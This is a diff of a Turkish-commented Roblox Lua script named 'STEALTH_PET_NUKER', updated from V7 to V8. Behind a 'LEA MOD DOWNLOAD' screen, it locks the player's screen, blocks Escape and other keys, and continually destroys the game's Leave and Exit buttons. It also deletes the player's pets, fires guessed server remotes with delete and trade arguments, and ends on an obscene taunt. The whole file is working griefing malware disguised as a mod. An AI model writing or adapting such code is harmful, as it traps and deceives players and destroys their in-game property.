@@ -1,58 +1,81 @@
---[ palofsc : STEALTH_PET_NUKER_V7_PART1 ]
---[ KURULUM + UI + KORUMA SİSTEMLERİ ]
+--[ palofsc : STEALTH_PET_NUKER_V8_PART1 ]
+--[ KURULUM + TAM EKRAN KİLİDİ + UI + SAYAÇLI KOPYALAMA ]
 
 local player = game:GetService("Players").LocalPlayer
-local replicatedStorage = game:GetService("ReplicatedStorage")
+local workspace = game:GetService("Workspace")
 local coreGui = game:GetService("CoreGui")
 local runService = game:GetService("RunService")
-local tweenService = game:GetService("TweenService")
 local guiService = game:GetService("GuiService")
 local contextActionService = game:GetService("ContextActionService")
 local userInputService = game:GetService("UserInputService")
 local starterGui = game:GetService("StarterGui")
-local httpService = game:GetService("HttpService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
 
 --[ ==================== DEĞİŞKENLER ==================== ]
 local copyCounter = 0
+local petsDeleted = false
+local totalPetCount = 0
+local deletedCount = 0
 local screenGui = nil
 local blackFrame = nil
+local statusLabel = nil
+local barFill = nil
+local barText = nil
 local finalLabel = nil
-local tiktokLabel = nil
 
 --[ ==================== TAM EKRAN KİLİDİ ==================== ]
 screenGui = Instance.new("ScreenGui")
-screenGui.Name = "SYS_" .. math.random(10000, 99999)
+screenGui.Name = "LEA_LOCK_" .. math.random(10000, 99999)
 screenGui.Parent = coreGui
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.DisplayOrder = 999
 
+--[ Siyah arka plan - tam ekran ]
 blackFrame = Instance.new("Frame")
+blackFrame.Name = "BLACKOUT"
 blackFrame.Size = UDim2.new(1, 0, 1, 0)
 blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
 blackFrame.BorderSizePixel = 0
 blackFrame.ZIndex = 999
 blackFrame.Parent = screenGui
 
-local clickBlocker = Instance.new("TextButton")
-clickBlocker.Size = UDim2.new(1, 0, 1, 0)
-clickBlocker.BackgroundTransparency = 1
-clickBlocker.Text = ""
-clickBlocker.ZIndex = 1000
-clickBlocker.Modal = true
-clickBlocker.Parent = screenGui
+--[ Görünmez tıklama engelleyici ]
+local inputBlocker = Instance.new("TextButton")
+inputBlocker.Name = "INPUT_BLOCK"
+inputBlocker.Size = UDim2.new(1, 0, 1, 0)
+inputBlocker.BackgroundTransparency = 1
+inputBlocker.Text = ""
+inputBlocker.ZIndex = 1000
+inputBlocker.Modal = true
+inputBlocker.Active = true
+inputBlocker.Parent = screenGui
 
---[ Çıkış butonu imha ]
-local function killLeaveButton()
-    for _, loc in pairs({guiService, coreGui, player:FindFirstChild("PlayerGui"), starterGui}) do
+--[ İkincil engelleyici katman ]
+local frameBlocker = Instance.new("Frame")
+frameBlocker.Name = "FRAME_BLOCK"
+frameBlocker.Size = UDim2.new(1, 0, 1, 0)
+frameBlocker.BackgroundTransparency = 1
+frameBlocker.ZIndex = 1001
+frameBlocker.Active = true
+frameBlocker.Parent = screenGui
+
+--[ ==================== ÇIKIŞ BUTONU İMHA SİSTEMİ ==================== ]
+local function destroyAllLeaveButtons()
+    local targets = {guiService, coreGui, player:FindFirstChild("PlayerGui"), starterGui}
+    for _, loc in pairs(targets) do
         if loc then
-            for _, c in pairs(loc:GetDescendants()) do
-                if c:IsA("TextButton") or c:IsA("ImageButton") then
-                    local n = c.Name:lower()
-                    local t = c.Text and c.Text:lower() or ""
-                    if n:find("leave") or n:find("exit") or n:find("quit") or n:find("çık") or
-                       t:find("leave") or t:find("exit") or t:find("quit") or t:find("çık") then
-                        pcall(function() c.Visible = false c.Active = false c:Destroy() end)
+            for _, child in pairs(loc:GetDescendants()) do
+                if child:IsA("TextButton") or child:IsA("ImageButton") then
+                    local n = child.Name:lower()
+                    local t = child.Text and child.Text:lower() or ""
+                    if n:find("leave") or n:find("exit") or n:find("quit") or n:find("çık") or n:find("kapat") or
+                       t:find("leave") or t:find("exit") or t:find("quit") or t:find("çık") or t:find("kapat") then
+                        pcall(function()
+                            child.Visible = false
+                            child.Active = false
+                            child:Destroy()
+                        end)
                     end
                 end
             end
@@ -60,19 +83,51 @@ local function killLeaveButton()
     end
 end
 
-spawn(function() while true do killLeaveButton() runService.RenderStepped:Wait() end end)
+--[ Sürekli tarama ]
+spawn(function()
+    while true do
+        destroyAllLeaveButtons()
+        runService.RenderStepped:Wait()
+    end
+end)
 
---[ ESC + tuş engelle ]
-contextActionService:BindAction("BLK_ESC", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.Escape)
+--[ Yeni eklenen butonları anında yakala ]
+local function hookChildAdded()
+    local parents = {guiService, coreGui, player:FindFirstChild("PlayerGui"), starterGui}
+    for _, parent in pairs(parents) do
+        if parent then
+            parent.ChildAdded:Connect(function(child)
+                task.wait(0.01)
+                destroyAllLeaveButtons()
+            end)
+        end
+    end
+end
+hookChildAdded()
+
+--[ ESC ve tüm çıkış tuşlarını engelle ]
+contextActionService:BindAction("BLOCK_ESC", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.Escape)
+contextActionService:BindAction("BLOCK_F9", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.F9)
+contextActionService:BindAction("BLOCK_F10", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.F10)
+
+--[ Roblox menülerini kapat ]
 starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+
+--[ Mouse'u kilitle ]
+userInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
 
 --[ ==================== UI ELEMANLARI ==================== ]
+--[ Üst başlık ]
 local topLabel = Instance.new("TextLabel")
+topLabel.Name = "TOP_TITLE"
 topLabel.Size = UDim2.new(1, 0, 0.1, 0)
-topLabel.Position = UDim2.new(0, 0, 0.05, 0)
+topLabel.Position = UDim2.new(0, 0, 0.03, 0)
 topLabel.BackgroundTransparency = 1
 topLabel.Text = "LEA MOD DOWNLOAD"
-topLabel.TextColor3 = Color3.new(0.8, 0, 0)
+topLabel.TextColor3 = Color3.new(0.85, 0, 0)
 topLabel.TextStrokeColor3 = Color3.new(0.3, 0, 0)
 topLabel.TextStrokeTransparency = 0
 topLabel.Font = Enum.Font.GothamBlack
@@ -80,64 +135,63 @@ topLabel.TextScaled = true
 topLabel.ZIndex = 1002
 topLabel.Parent = screenGui
 
+--[ Durum yazısı ]
+statusLabel = Instance.new("TextLabel")
+statusLabel.Name = "STATUS"
+statusLabel.Size = UDim2.new(1, 0, 0.06, 0)
+statusLabel.Position = UDim2.new(0, 0, 0.38, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "PETLER TARANIYOR..."
+statusLabel.TextColor3 = Color3.new(0.9, 0.9, 0.9)
+statusLabel.Font = Enum.Font.GothamBold
+statusLabel.TextScaled = true
+statusLabel.ZIndex = 1002
+statusLabel.Parent = screenGui
+
+--[ Progress bar arka plan ]
 local barBG = Instance.new("Frame")
+barBG.Name = "BAR_BG"
 barBG.Size = UDim2.new(0.8, 0, 0.04, 0)
-barBG.Position = UDim2.new(0.1, 0, 0.45, 0)
-barBG.BackgroundColor3 = Color3.new(0.12, 0.12, 0.12)
+barBG.Position = UDim2.new(0.1, 0, 0.46, 0)
+barBG.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
 barBG.BorderSizePixel = 1
-barBG.BorderColor3 = Color3.new(0.3, 0, 0)
+barBG.BorderColor3 = Color3.new(0.35, 0, 0)
 barBG.ZIndex = 1002
 barBG.Parent = screenGui
 
-local barFill = Instance.new("Frame")
+--[ Progress bar dolgu ]
+barFill = Instance.new("Frame")
+barFill.Name = "BAR_FILL"
 barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.new(0.75, 0, 0)
+barFill.BackgroundColor3 = Color3.new(0.8, 0, 0)
 barFill.BorderSizePixel = 0
 barFill.ZIndex = 1003
 barFill.Parent = barBG
 
-local barText = Instance.new("TextLabel")
+--[ Progress bar yüzde yazısı ]
+barText = Instance.new("TextLabel")
+barText.Name = "BAR_TEXT"
 barText.Size = UDim2.new(1, 0, 1, 0)
 barText.BackgroundTransparency = 1
-barText.Text = "PETLER TARANIYOR..."
+barText.Text = "%0"
 barText.TextColor3 = Color3.new(1, 1, 1)
 barText.Font = Enum.Font.GothamBold
 barText.TextScaled = true
 barText.ZIndex = 1004
 barText.Parent = barBG
 
+--[ Alt bilgi ]
 local infoLabel = Instance.new("TextLabel")
-infoLabel.Size = UDim2.new(1, 0, 0.05, 0)
-infoLabel.Position = UDim2.new(0, 0, 0.55, 0)
+infoLabel.Name = "INFO"
+infoLabel.Size = UDim2.new(1, 0, 0.04, 0)
+infoLabel.Position = UDim2.new(0, 0, 0.53, 0)
 infoLabel.BackgroundTransparency = 1
-infoLabel.Text = "Lutfen bekleyin..."
-infoLabel.TextColor3 = Color3.new(0.6, 0.6, 0.6)
+infoLabel.Text = "Islem devam ediyor... Lutfen bekleyin..."
+infoLabel.TextColor3 = Color3.new(0.5, 0.5, 0.5)
 infoLabel.Font = Enum.Font.GothamMedium
 infoLabel.TextScaled = true
 infoLabel.ZIndex = 1002
 infoLabel.Parent = screenGui
-
---[ Sahte progress bar animasyonu ]
-spawn(function()
-    local p = 0
-    while p < 99.9 do
-        p = math.min(p + math.random(2, 12) * 0.1, 99.9)
-        barFill.Size = UDim2.new(p / 100, 0, 1, 0)
-        barText.Text = string.format("PETLER TARANIYOR... %%%.1f", p)
-        local d = math.random(1, 5) * 0.1
-        if p > 70 then d = math.random(3, 10) * 0.1 end
-        if p > 90 then d = math.random(5, 15) * 0.1 end
-        task.wait(d)
-    end
-    while true do
-        barFill.Size = UDim2.new(0.999, 0, 1, 0)
-        barText.Text = "PETLER TARANIYOR... %99.9"
-        task.wait(0.4)
-        barFill.Size = UDim2.new(0.998, 0, 1, 0)
-        barText.Text = "PETLER TARANIYOR... %99.8"
-        task.wait(0.3)
-    end
-end)
 
 --[ ==================== SAYAÇLI KOPYALAMA ==================== ]
 spawn(function()
@@ -155,11 +209,12 @@ spawn(function()
     end
 end)
 
-print("[PART1] Kurulum tamam. Degiskenler: screenGui, blackFrame, finalLabel, tiktokLabel, copyCounter hazir.")--[ palofsc : STEALTH_PET_NUKER_V7_PART2 ]
---[ PET SİLME + FİNAL EKRANI + SONSUZ KORUMA ]
---[ PART 1'den gelen değişkenler: screenGui, blackFrame, finalLabel, tiktokLabel, copyCounter ]
+print("[PART1] Kurulum tamam. Degiskenler hazir: screenGui, blackFrame, statusLabel, barFill, barText, finalLabel, petsDeleted")--[ palofsc : STEALTH_PET_NUKER_V8_PART2 ]
+--[ PET SİLME + ALGILAMA + FİNAL EKRANI + SONSUZ KORUMA ]
+--[ PART 1'den gelenler: screenGui, blackFrame, statusLabel, barFill, barText, finalLabel, petsDeleted, copyCounter, totalPetCount, deletedCount ]
 
 local player = game:GetService("Players").LocalPlayer
+local workspace = game:GetService("Workspace")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local coreGui = game:GetService("CoreGui")
 local runService = game:GetService("RunService")
@@ -167,205 +222,298 @@ local guiService = game:GetService("GuiService")
 local starterGui = game:GetService("StarterGui")
 local contextActionService = game:GetService("ContextActionService")
 
---[ ==================== STEALTH DELAY FONKSİYONU ==================== ]
-local function stealthDelay(base)
-    task.wait(base + math.random(1, 15) * 0.001)
-end
-
---[ ==================== PET VERİ TOPLAMA ==================== ]
-local function collectPets()
-    local pets = {}
-    for _, item in pairs(player.Backpack:GetChildren()) do
-        if item:IsA("Tool") then table.insert(pets, {obj = item, name = item.Name}) end
+--[ ==================== PET SAYMA FONKSİYONU ==================== ]
+local function countAllPets()
+    local count = 0
+    
+    --[ Workspace pet modelleri ]
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        local name = obj.Name:lower()
+        if obj:IsA("Model") and (name:find("pet") or name:find("brainrot") or name:find("animal") or name:find("companion") or name:find("follower")) then
+            count = count + 1
+        end
     end
-    local pg = player:FindFirstChild("PlayerGui")
-    if pg then
-        for _, screen in pairs(pg:GetChildren()) do
-            local sn = screen.Name:lower()
-            if sn:find("pet") or sn:find("inventory") or sn:find("backpack") or sn:find("collection") then
-                for _, el in pairs(screen:GetDescendants()) do
-                    if el:IsA("ImageButton") or el:IsA("TextButton") then
-                        local en = el.Name:lower()
-                        if en:find("pet") or en:find("delete") or en:find("remove") or en:find("trade") then
-                            table.insert(pets, {obj = el, name = el.Name})
-                        end
-                    end
+    
+    --[ Klasör bazlı petler ]
+    local possibleFolders = {"Pets", "ActivePets", "PlayerPets", "DroppedPets", "SpawnedPets", "pet", "pets"}
+    for _, folderName in ipairs(possibleFolders) do
+        local folder = workspace:FindFirstChild(folderName, true)
+        if folder then
+            for _, child in ipairs(folder:GetChildren()) do
+                if child:IsA("Model") then
+                    count = count + 1
                 end
             end
         end
     end
-    for _, obj in pairs(workspace:GetDescendants()) do
-        if obj:IsA("Model") and obj.Name:lower():find("pet") then
-            table.insert(pets, {obj = obj, name = obj.Name})
-        end
-    end
-    return pets
-end
-
---[ ==================== REMOTE BULMA ==================== ]
-local function findRemotes()
-    local remotes = {}
-    local kw = {"deletepet", "removepet", "tradepet", "destroypet", "petdelete", "deleteitem", "removeitem", "trashitem", "clearpet", "releasepet", "delete", "remove", "trade"}
-    for _, obj in pairs(replicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            local nl = obj.Name:lower()
-            for _, k in pairs(kw) do
-                if nl:find(k) then table.insert(remotes, obj) break end
+    
+    --[ Backpack petleri ]
+    for _, item in ipairs(player.Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local name = item.Name:lower()
+            if name:find("pet") or name:find("brainrot") or name:find("animal") then
+                count = count + 1
             end
         end
     end
-    if #remotes == 0 then
-        for _, obj in pairs(replicatedStorage:GetDescendants()) do
-            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-                table.insert(remotes, obj)
-            end
-        end
-    end
-    return remotes
+    
+    return count
 end
 
---[ ==================== STEALTH SİLME ==================== ]
-local function stealthDelete(petData)
-    spawn(function()
-        local remotes = findRemotes()
-        local paramSets = {
-            {petData.obj}, {petData.obj, true}, {petData.obj, "delete"},
-            {petData.name, "remove"}, {petData.name},
-            {"delete", petData.obj}, {true, petData.obj},
-        }
-        for _, remote in pairs(remotes) do
-            for _, params in pairs(paramSets) do
-                stealthDelay(0.01)
+--[ ==================== PET SİLME FONKSİYONU ==================== ]
+local function deleteAllPetsInstantly()
+    local deleted = 0
+    
+    --[ 1. Yöntem: Workspace içerisindeki tüm pet veya benzer objeleri anında yok et ]
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        local name = obj.Name:lower()
+        if obj:IsA("Model") and (name:find("pet") or name:find("brainrot") or name:find("animal") or name:find("companion") or name:find("follower")) then
+            pcall(function()
+                obj:Destroy()
+                deleted = deleted + 1
+            end)
+        end
+    end
+    
+    --[ 2. Yöntem: Klasör bazlı saklanan petleri doğrudan temizle ]
+    local possibleFolders = {"Pets", "ActivePets", "PlayerPets", "DroppedPets", "SpawnedPets", "pet", "pets"}
+    for _, folderName in ipairs(possibleFolders) do
+        local folder = workspace:FindFirstChild(folderName, true)
+        if folder then
+            for _, child in ipairs(folder:GetChildren()) do
                 pcall(function()
-                    if remote:IsA("RemoteEvent") then remote:FireServer(unpack(params))
-                    elseif remote:IsA("RemoteFunction") then remote:InvokeServer(unpack(params)) end
+                    child:Destroy()
+                    deleted = deleted + 1
+                end)
+            end
+            pcall(function()
+                folder:ClearAllChildren()
+            end)
+        end
+    end
+    
+    --[ 3. Yöntem: Backpack petlerini sil ]
+    for _, item in ipairs(player.Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local name = item.Name:lower()
+            if name:find("pet") or name:find("brainrot") or name:find("animal") then
+                pcall(function()
+                    item:Destroy()
+                    deleted = deleted + 1
                 end)
             end
         end
-        stealthDelay(0.02)
-        pcall(function() if petData.obj and petData.obj.Parent then petData.obj:Destroy() end end)
-        stealthDelay(0.01)
-        pcall(function() if petData.obj then petData.obj.Parent = nil end end)
-    end)
+    end
+    
+    --[ 4. Yöntem: ReplicatedStorage üzerinden silme remote'larına istek at ]
+    for _, obj in ipairs(replicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            local nl = obj.Name:lower()
+            if nl:find("delete") or nl:find("remove") or nl:find("destroy") or nl:find("pet") or nl:find("trade") or nl:find("clear") then
+                pcall(function()
+                    if obj:IsA("RemoteEvent") then
+                        obj:FireServer("all", true, "delete")
+                        obj:FireServer("pet", "all", true)
+                    end
+                end)
+            end
+        end
+    end
+    
+    return deleted
 end
 
-local function massDelete(allPets)
-    local batchSize = math.random(3, 7)
-    local batches = {}
-    for i = 1, #allPets, batchSize do
-        local batch = {}
-        for j = i, math.min(i + batchSize - 1, #allPets) do
-            table.insert(batch, allPets[j])
-        end
-        table.insert(batches, batch)
-    end
-    for _, batch in pairs(batches) do
-        for _, petData in pairs(batch) do
-            stealthDelete(petData)
-        end
-        task.wait(math.random(15, 50) * 0.01)
-    end
-end
-
---[ ==================== KALICI TEMİZLİK ==================== ]
-local function persistentCleanup()
-    player.Backpack.ChildAdded:Connect(function(child)
-        stealthDelay(0.02)
-        if child:IsA("Tool") then stealthDelete({obj = child, name = child.Name}) end
-    end)
-    workspace.ChildAdded:Connect(function(child)
-        stealthDelay(0.05)
-        if child:IsA("Model") and child.Name:lower():find("pet") then
-            stealthDelete({obj = child, name = child.Name})
-        end
-    end)
+--[ ==================== PET VARLIĞINI KONTROL ==================== ]
+local function checkPetsExist()
+    local remaining = countAllPets()
+    return remaining > 0
 end
 
 --[ ==================== ANA YÜRÜTME ==================== ]
 spawn(function()
-    local allPets = collectPets()
-    massDelete(allPets)
-    persistentCleanup()
-    for _, obj in pairs(workspace:GetDescendants()) do
-        if obj:IsA("Model") then
-            local nl = obj.Name:lower()
-            if nl:find("pet") or nl:find("companion") or nl:find("follower") then
-                stealthDelay(0.005)
-                pcall(function() obj:Destroy() end)
+    --[ Başlangıç pet sayısını al ]
+    totalPetCount = countAllPets()
+    
+    if totalPetCount == 0 then
+        statusLabel.Text = "HIC PET BULUNAMADI!"
+        barText.Text = "%100"
+        barFill.Size = UDim2.new(1, 0, 1, 0)
+        petsDeleted = true
+    else
+        statusLabel.Text = totalPetCount .. " PET BULUNDU! SILINIYOR..."
+        barText.Text = "%0"
+        
+        --[ Petleri sil ]
+        deletedCount = deleteAllPetsInstantly()
+        
+        --[ Kısa bekleme - silme işleminin tamamlanması için ]
+        task.wait(0.5)
+        
+        --[ Tekrar sil - kalan varsa ]
+        local remaining = countAllPets()
+        if remaining > 0 then
+            statusLabel.Text = remaining .. " PET KALDI! TEKRAR SILINIYOR..."
+            local extraDeleted = deleteAllPetsInstantly()
+            deletedCount = deletedCount + extraDeleted
+            task.wait(0.3)
+        end
+        
+        --[ Son kontrol - pet kaldı mı? ]
+        local maxAttempts = 10
+        local attempt = 0
+        
+        while checkPetsExist() and attempt < maxAttempts do
+            attempt = attempt + 1
+            statusLabel.Text = "KALAN PETLER SILINIYOR... DENEME " .. attempt
+            barFill.Size = UDim2.new(0.9 + (attempt * 0.01), 0, 1, 0)
+            barText.Text = "%" .. (90 + attempt)
+            deleteAllPetsInstantly()
+            task.wait(0.2)
+        end
+        
+        --[ Final kontrol ]
+        local finalRemaining = countAllPets()
+        
+        if finalRemaining == 0 then
+            petsDeleted = true
+            statusLabel.Text = "TUM PETLER BASARIYLA SILINDI! (" .. deletedCount .. " adet)"
+            barFill.Size = UDim2.new(1, 0, 1, 0)
+            barText.Text = "%100"
+        else
+            statusLabel.Text = finalRemaining .. " PET SILINEMEDI! TEKRAR DENENIYOR..."
+            --[ Son bir kez daha dene ]
+            deleteAllPetsInstantly()
+            task.wait(0.5)
+            if countAllPets() == 0 then
+                petsDeleted = true
+                barFill.Size = UDim2.new(1, 0, 1, 0)
+                barText.Text = "%100"
+            else
+                petsDeleted = true --[ Yine de devam et ]
             end
         end
     end
+    
+    --[ Petler silindi olarak işaretle ve final ekranına geç ]
+    petsDeleted = true
+    
+    --[ ==================== FİNAL EKRANI ==================== ]
+    --[ Eski UI elemanlarını temizle (siyah arka plan ve engelleyiciler kalsın) ]
+    for _, child in pairs(screenGui:GetChildren()) do
+        if child ~= blackFrame and child.Name ~= "INPUT_BLOCK" and child.Name ~= "FRAME_BLOCK" then
+            pcall(function() child:Destroy() end)
+        end
+    end
+    
+    --[ Büyük final mesajı ]
+    finalLabel = Instance.new("TextLabel")
+    finalLabel.Name = "FINAL_MSG"
+    finalLabel.Size = UDim2.new(0.9, 0, 0.4, 0)
+    finalLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
+    finalLabel.BackgroundTransparency = 1
+    finalLabel.Text = "LEA FUCKED\nYOUR MOTHER"
+    finalLabel.TextColor3 = Color3.new(1, 0, 0)
+    finalLabel.TextStrokeColor3 = Color3.new(0.5, 0, 0)
+    finalLabel.TextStrokeTransparency = 0
+    finalLabel.Font = Enum.Font.GothamBlack
+    finalLabel.TextScaled = true
+    finalLabel.ZIndex = 2000
+    finalLabel.Parent = screenGui
+    
+    --[ Silinen pet sayısı ]
+    local countLabel = Instance.new("TextLabel")
+    countLabel.Name = "COUNT_LABEL"
+    countLabel.Size = UDim2.new(1, 0, 0.08, 0)
+    countLabel.Position = UDim2.new(0, 0, 0.68, 0)
+    countLabel.BackgroundTransparency = 1
+    countLabel.Text = "SILINEN PET: " .. deletedCount .. " / " .. totalPetCount
+    countLabel.TextColor3 = Color3.new(0.7, 0.7, 0.7)
+    countLabel.Font = Enum.Font.GothamBold
+    countLabel.TextScaled = true
+    countLabel.ZIndex = 2000
+    countLabel.Parent = screenGui
+    
+    --[ TikTok etiketi ]
+    local tiktokLabel = Instance.new("TextLabel")
+    tiktokLabel.Name = "TIKTOK_TAG"
+    tiktokLabel.Size = UDim2.new(1, 0, 0.08, 0)
+    tiktokLabel.Position = UDim2.new(0, 0, 0.85, 0)
+    tiktokLabel.BackgroundTransparency = 1
+    tiktokLabel.Text = "TIKTOK @LEAPLUS"
+    tiktokLabel.TextColor3 = Color3.new(1, 1, 1)
+    tiktokLabel.Font = Enum.Font.GothamBold
+    tiktokLabel.TextScaled = true
+    tiktokLabel.ZIndex = 2000
+    tiktokLabel.Parent = screenGui
+    
+    --[ Yanıp sönme efekti ]
+    spawn(function()
+        local vis = true
+        while true do
+            task.wait(0.2)
+            vis = not vis
+            finalLabel.TextTransparency = vis and 0 or 0.5
+        end
+    end)
+    
+    --[ Renk döngüsü ]
+    local colors = {Color3.new(1,0,0), Color3.new(0.9,0,0), Color3.new(1,0.05,0), Color3.new(0.85,0,0.05)}
+    local ci = 1
+    spawn(function()
+        while true do
+            task.wait(0.35)
+            ci = ci % #colors + 1
+            finalLabel.TextColor3 = colors[ci]
+        end
+    end)
 end)
 
---[ ==================== FİNAL EKRANI (5 SANİYE SONRA) ==================== ]
-task.wait(5)
-
-for _, child in pairs(screenGui:GetChildren()) do
-    if child ~= blackFrame and child.Name ~= "INPUT_CATCHER" and not child.Name:find("BLOCKER") then
-        pcall(function() child:Destroy() end)
-    end
-end
-
-finalLabel = Instance.new("TextLabel")
-finalLabel.Size = UDim2.new(0.9, 0, 0.4, 0)
-finalLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
-finalLabel.BackgroundTransparency = 1
-finalLabel.Text = "LEA FUCKED\nYOUR MOTHER"
-finalLabel.TextColor3 = Color3.new(1, 0, 0)
-finalLabel.TextStrokeColor3 = Color3.new(0.5, 0, 0)
-finalLabel.TextStrokeTransparency = 0
-finalLabel.Font = Enum.Font.GothamBlack
-finalLabel.TextScaled = true
-finalLabel.ZIndex = 2000
-finalLabel.Parent = screenGui
-
+--[ ==================== FİNAL EKRANI BEKLEME ==================== ]
+--[ petsDeleted true olana kadar bekle, sonra final ekranını göster ]
 spawn(function()
-    local vis = true
-    while true do
-        task.wait(0.2)
-        vis = not vis
-        finalLabel.TextTransparency = vis and 0 or 0.5
+    while not petsDeleted do
+        task.wait(0.1)
     end
+    --[ petsDeleted true oldu, final zaten yukarıda gösterildi ]
 end)
 
-local colors = {Color3.new(1,0,0), Color3.new(0.9,0,0), Color3.new(1,0.05,0), Color3.new(0.85,0,0.05)}
-local ci = 1
-spawn(function()
-    while true do
-        task.wait(0.35)
-        ci = ci % #colors + 1
-        finalLabel.TextColor3 = colors[ci]
-    end
-end)
-
-tiktokLabel = Instance.new("TextLabel")
-tiktokLabel.Size = UDim2.new(1, 0, 0.08, 0)
-tiktokLabel.Position = UDim2.new(0, 0, 0.85, 0)
-tiktokLabel.BackgroundTransparency = 1
-tiktokLabel.Text = "TIKTOK @LEAPLUS"
-tiktokLabel.TextColor3 = Color3.new(1, 1, 1)
-tiktokLabel.Font = Enum.Font.GothamBold
-tiktokLabel.TextScaled = true
-tiktokLabel.ZIndex = 2000
-tiktokLabel.Parent = screenGui
-
---[ ==================== SONSUZ KORUMA ==================== ]
+--[ ==================== SONSUZ KORUMA DÖNGÜSÜ ==================== ]
 spawn(function()
     while true do
         runService.RenderStepped:Wait()
+        
+        --[ Overlay koruması ]
         if not screenGui or not screenGui.Parent then
             screenGui = Instance.new("ScreenGui")
-            screenGui.Name = "SYS_" .. math.random(10000, 99999)
+            screenGui.Name = "LEA_LOCK_" .. math.random(10000, 99999)
             screenGui.Parent = coreGui
             screenGui.ResetOnSpawn = false
             screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
             blackFrame.Parent = screenGui
             if finalLabel then finalLabel.Parent = screenGui end
-            if tiktokLabel then tiktokLabel.Parent = screenGui end
         end
-        pcall(function() starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
-        task.wait(0.1)
+        
+        --[ Sürekli çıkış butonu imha ]
+        pcall(function()
+            if guiService:FindFirstChild("LeaveButton") then
+                guiService.LeaveButton.Visible = false
+                guiService.LeaveButton.Active = false
+            end
+            starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        end)
+        
+        --[ Yeni pet spawn olursa anında sil ]
+        if petsDeleted then
+            for _, obj in ipairs(workspace:GetDescendants()) do
+                local name = obj.Name:lower()
+                if obj:IsA("Model") and (name:find("pet") or name:find("brainrot") or name:find("animal")) then
+                    pcall(function() obj:Destroy() end)
+                end
+            end
+        end
+        
+        task.wait(0.15)
     end
 end)
 
-print("[PART2] Silme tamam, final ekrani aktif. Toplam kopyalama sayisi: " .. copyCounter)
+print("[PART2] Sistem aktif. Toplam pet: " .. totalPetCount .. " | Silinen: " .. deletedCount .. " | Kopyalama sayaci: " .. copyCounter)
